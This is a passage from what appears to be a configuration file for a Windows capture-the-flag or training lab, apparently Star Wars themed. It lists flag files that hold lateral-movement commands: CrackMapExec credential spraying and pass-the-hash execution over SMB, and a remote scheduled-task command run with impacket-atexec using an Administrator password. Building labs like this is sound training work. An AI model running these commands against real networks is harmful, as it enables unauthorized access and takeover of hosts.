        CrackMapExec (covers SMB/WMI/MSSQL/WinRM channels):
          crackmapexec smb 10.10.0.0/24 -u Administrator -p SithLord123! --shares
          crackmapexec smb 10.10.0.13 -u svc_bobafett -H $(hash) -x "net user"

    - path: 'C:\Flags\FLAG-LAT-090-AtSched.txt'
      content: |
        LAT-090: Remote Scheduled Task Lateral Movement
        =================================================
        impacket-atexec EMPIRE/Administrator:SithLord123!@10.10.0.13 "cmd /c whoami > C:\output.txt"

        PowerShell at:
